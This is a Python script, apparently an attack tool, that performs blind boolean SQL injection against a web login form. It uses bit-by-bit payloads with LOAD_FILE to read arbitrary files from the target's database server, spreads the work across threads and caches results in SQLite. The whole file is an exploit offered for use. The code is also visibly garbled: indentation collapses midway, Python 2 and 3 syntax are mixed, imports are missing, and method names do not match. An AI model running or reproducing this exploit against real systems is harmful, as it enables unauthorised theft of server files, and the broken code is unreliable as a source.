#!/usr/bin/env python3

import argparse
import queue
import sqlite3
import sys
import threading
import time
from pathlib import Path

class Database:
    def __init__(self):
        self.__create_table()
        
    def __create_conection(self):
        conn = None
        try:
            conn = sqlite3.connect("files.db")
        except:
            sys.exit("Erro ao conectar ao banco de dados.")
        return conn
def __create_table(self):
    conn = self.__create_conection()
    sql_create_files_table = """CREATE TABLE IF NOT EXISTS files (
                                    id INTEGER PRIMARY KEY,
                                    name TEXT NOT NULL,
                                    character VARCHAR(1) NOT NULL,
                                    position INTEGER NOT NULL
                                    )"""
    sql_create_files_size_table = """CREATE TABLE IF NOT EXISTS files_size (
                                     id INTEGER PRIMARY KEY,
                                     name TEXT NOT NULL,
                                     size INTEGER NOT NULL
                                     )"""
    try:
        c = conn.cursor()
        c.execute(sql_create_files_table)
        c.execute(sql_create_files_size_table)
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        print(f"Erro ao criar tabelas: {e}")
def insert_file(self, data):
    conn = self.__create_conection()
    conn = self.__create_conection()
    sql_insert_file_table = """INSERT INTO files(name, character, position) VALUES(?, ?, ?)"""
    c = conn.cursor()
    c.execute(sql_insert_file_table, data)
    conn.commit()
    conn.close()
    return c.lastrowid

def insert_file_size(self, data):
    conn = self.__create_connection()
    sql_insert_files_size_table = """INSERT INTO files_size(name,size) VALUES(?,?);"""
    c = conn.cursor()
    c.execute(sql_insert_files_size_table, data)
    conn.commit()
    conn.close()
    return c.lastrowid

def exists_character_by_position(self, data):
    conn = self.__create_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM files WHERE name=? and position=?", data)
    rows = c.fetchall()
    conn.close()
    return len(rows) != 0

def get_file_size(self, data):
    conn = self.__create_connection()
    c = conn.cursor()
    c.execute(
    "select size from files_size where name=? and size != 0", data)
    row = c.fetchone()
    conn.close()
    size = 0
    if row:        
        size = row[0]
    return size

def get_downloaded_quantity(self, data):
    conn = self.__create_connection()
    c = conn.cursor()
    c.execute(
    "select distinct position from files where name=? order by position desc limit 1", data)
    row = c.fetchone()
    conn.close()
    size = 0
    if row:
        size = row[0]
    return size

def print_archive(self, data):
    conn = self.__create_connection()
    c = conn.cursor()
    c.execute(
    "select character from files where name=? order by position;", data)
    rows = c.fetchall()
    conn.close()
    archive = ""
    for row in rows:
        
        archive += row[0]
    return archive

class SQLInjection:
    def __init__(self, url,proxy)
        self.__session = requests.Session()
        self.url = url
        self.__token = None
        if proxy:
            self.__session.proxies = {
                'http': proxy,
            }
    def __request(self, payload):
        
        if self.__token == None:
            r = self.__session.get(self.url)
            soup = BeautifulSoup(r.content, 'html.parser')
            self.__token = soup.find("input", type="hidden")['value']
        headers = {'Content-type': 'application/x-www-form-urlencoded'}
        data = "_token={}&username={}--+-&password='--+-".format(
            self.__token, payload)
        r = self.__session.post(self.url, headers=headers, data=data)
        return r
def __extrac_byte(self, exploit):
    byte = ""
for bit_pos in range(7, -1, -1):
payload = "'OR(SELECT+(({}>>{})%261))=1".format(exploit, bit_pos)
r = self.__request(payload)
if r.status_code != 200:
raise Exception("Unexpected Status: %d" % (r.status_code))
soup = BeautifulSoup(r.content, 'html.parser')
bit = '1' if "autorizado" in soup.find('b').string else '0'
byte += bit
return byte

def length_data(self, archive):
try:
length = ""
for letter_pos in range(1, 999):
exploit = "ASCII(SUBSTRING(CHAR_LENGTH(LOAD_FILE('{}')),{},1))".format(
archive, letter_pos)
byte = self.__extrac_byte(exploit)
char = chr(int(byte, 2))
if not char.isalnum():
break
length += char
return int(length)
except:
return 0

def extract_character_by_position(self, archive, letter_pos):
exploit = "ASCII(SUBSTRING((LOAD_FILE('{}')),{},1))".format(
archive, letter_pos)
byte = self.__extrac_byte(exploit)
char = unichr(int(byte, 2))
return char

class WorkerThread(threading.Thread):
def __init__(self, queue, args, tid):
threading.Thread.__init__(self)
self.__queue = queue
self.__archive = args.file
self.tid = tid
self.__database = Database()
self.__sqli = SQLInjection(args.url, args.proxy)

def run(self):
while True:
position = None
try:
position = self.__queue.get(timeout=1)
except Queue.Empty:
return
if position:
try:
if not self.__database.exists_character_by_position((self.__archive, position)):
char = self.__sqli.extract_character_by_position(
self.__archive, position)
self.__database.insert_character(
(self.__archive, char, position))
except:
return
self.__queue.task_done()

def create_thread(queue, args, tid):
worker = WorkerThread(queue, args, tid)
worker.setDaemon(True)
worker.start()
return worker

parser = argparse.ArgumentParser()
parser.add_argument(
"-f", "--file", help="Read a file from the back-end DBMS file system", required=True)
parser.add_argument(
"-u", "--url", help="Target URL (e.g. \"http://www.site.com/\")")
parser.add_argument(
"-t", "--threads", help="Max number of concurrent HTTP(s) requests (default 1)", nargs='?', const=1, type=int, default=1)
parser.add_argument(
"-x", "--proxy", help="Use a proxy to connect to the target URL")
args = parser.parse_args()
queue = Queue.Queue()
database = Database()

length_character = database.get_file_size((args.file,))
if not args.url:
if length_character == 0:
print "File does not exist or has no content"
else:
quantity = database.get_downloaded_quantity((args.file,))
print "File size: %d bytes" % quantity
print database.print_archive((args.file,))
exit(0)
if length_character == 0:
sqli = SQLInjection(args.url, args.proxy)
length_character = sqli.length_data(args.file)
database.insert_file_size((args.file, length_character))
print "File size: %d bytes" % length_character
if length_character > 0:
for position in range(1, length_character + 1):
queue.put(position)
threads = []
for tid in range(1, args.threads + 1):
worker = create_thread(queue, args, tid)
threads.append(worker)
is_alive = True
while not queue.empty() and is_alive:
try:
for tid in range(0, len(threads)):
if not is_alive and not queue.empty():
worker = create_thread(queue, args, tid)
threads[tid] = worker
is_alive = threads[tid].is_alive()
except KeyboardInterrupt:
sys.exit(1)
quantity = database.get_downloaded_quantity((args.file,))
if quantity >= (length_character - 1):
print database.print_archive((args.file,)
                             else:
print "File does not exist or has no content"